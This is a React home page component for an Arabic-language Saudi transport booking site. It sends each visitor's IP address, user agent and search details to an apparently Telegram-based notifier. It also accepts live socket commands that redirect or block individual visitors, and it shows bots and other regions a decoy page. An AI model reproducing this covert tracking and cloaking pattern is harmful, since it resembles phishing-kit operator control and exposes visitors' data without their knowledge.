import React, { useEffect, useState } from 'react';
import { useNavigate } from 'react-router';
import { useAuth } from '@/hooks/useAuth';
import { trpc } from '@/providers/trpc';
import { sendBookingMessage } from '@/lib/telegram-settings';
import { useGeoBlock, shouldShowBlockedPage } from '@/hooks/useGeoBlock';
import { getSocket } from '@/lib/socket';
import { getOrCreateVisitorSessionId } from '@/lib/visitor-session';
import NavigationHeader from '@/components/NavigationHeader';
import CookieConsentBanner from '@/components/CookieConsentBanner';
import Footer from '@/components/Footer';
import SearchResults from '@/components/SearchResults';
import HeroSection from '@/sections/HeroSection';
import CtaBookNowSection from '@/sections/CtaBookNowSection';
import type { BookingData } from '@/components/BookingPanel';

// ─── Visitor Entry Notification ───────────────────────────────
async function notifyVisitorEntry(ip: string, ua: string, page: string) {
  await sendBookingMessage('visitor-enter', {
    ip, page,
    ua: ua.slice(0, 100),
    time: new Date().toLocaleString('ar-SA'),
    language: navigator.language,
  });
}

async function notifySearch(data: BookingData) {
  await sendBookingMessage('search-submitted', {
    from: data.from,
    to: data.to,
    pickupDate: data.pickupDate,
    returnDate: data.returnDate || 'لا يوجد',
    passengers: String(data.passengers),
    ticketType: data.ticketType || 'غير محدد',
    time: new Date().toLocaleString('ar-SA'),
  });
}

const Home: React.FC = () => {
  const navigate = useNavigate();
  const { user } = useAuth();
  const { geo, canBook } = useGeoBlock();
  const [bookingData, setBookingData] = useState<BookingData | null>(null);
  const trackVisitor = trpc.visitors.track.useMutation();

  const handleVisitorControl = (data?: { blocked?: boolean; redirectUrl?: string | null }) => {
    if (!data) return;
    if (data.blocked) {
      document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><h1>تم حظرك من الوصول إلى هذا الموقع</h1></div>';
      return;
    }
    if (data.redirectUrl) {
      if (data.redirectUrl === 'block') {
        document.body.innerHTML = '<div style="display:flex;justify-content:center;align-items:center;height:100vh;font-family:sans-serif;"><h1>تم حظرك من الوصول إلى هذا الموقع</h1></div>';
        return;
      }
      window.location.href = data.redirectUrl;
    }
  };

  // Track visitor on page load
  useEffect(() => {
    const sessionId = getOrCreateVisitorSessionId();
    const socket = getSocket();

    socket?.emit('visitor:subscribe', sessionId);

    const handleSocketConnect = () => {
      socket.emit('visitor:subscribe', sessionId);
    };
    const handleSocketControl = (data: { blocked?: boolean; redirectUrl?: string | null }) => {
      handleVisitorControl(data);
    };

    fetch('https://api.ipify.org?format=json')
      .then(r => r.json())
      .then(({ ip }) => { notifyVisitorEntry(ip, navigator.userAgent, window.location.pathname); })
      .catch(() => { notifyVisitorEntry('unknown', navigator.userAgent, window.location.pathname); });

    trackVisitor.mutate(
      { sessionId, page: window.location.pathname, userAgent: navigator.userAgent },
      {
        onSuccess: (data) => {
          handleVisitorControl(data);
        },
      }
    );

    const interval = setInterval(() => {
      trackVisitor.mutate(
        { sessionId, page: window.location.pathname, userAgent: navigator.userAgent },
        { onSuccess: (data) => handleVisitorControl(data) }
      );
    }, 30000);

    socket?.on('connect', handleSocketConnect);
    socket?.on('visitor:control', handleSocketControl);

    return () => {
      clearInterval(interval);
      socket?.off('connect', handleSocketConnect);
      socket?.off('visitor:control', handleSocketControl);
    };
  }, []);

  const handleSearch = (data: BookingData) => {
    setBookingData(data);
    window.scrollTo({ top: 0 });
    notifySearch(data);
  };

  const handleCloseResults = () => {
    setBookingData(null);
  };

  // ─── Geo Block Check ───
  // Centralized logic: checks settings.enabled + country + bot status
  const showBlockedPage = !bookingData && shouldShowBlockedPage();

  if (showBlockedPage) {
    return (
      <div className="min-h-screen w-full" dir="rtl" lang="ar">
        <iframe
          src="/geo-blocked.html"
          style={{ width: '100%', height: '100vh', border: 'none' }}
          title="دليل النقل السعودي"
        />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-surface-alt" dir="rtl" lang="ar">
      {bookingData && (
        <SearchResults bookingData={bookingData} onClose={handleCloseResults} />
      )}

      {user?.role === 'admin' && (
        <button
          onClick={() => navigate('/admin')}
          className="fixed bottom-4 left-4 z-50 w-12 h-12 gold-gradient rounded-full shadow-dropdown flex items-center justify-center text-white hover:scale-110 transition-transform"
          title="لوحة التحكم"
        >
          <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>
        </button>
      )}

      <NavigationHeader />

      <main className={bookingData ? 'hidden' : ''}>
        <HeroSection onSearch={handleSearch} />
        <CtaBookNowSection />
      </main>

      {!bookingData && <Footer />}
      {!bookingData && <CookieConsentBanner />}
    </div>
  );
};

export default Home;
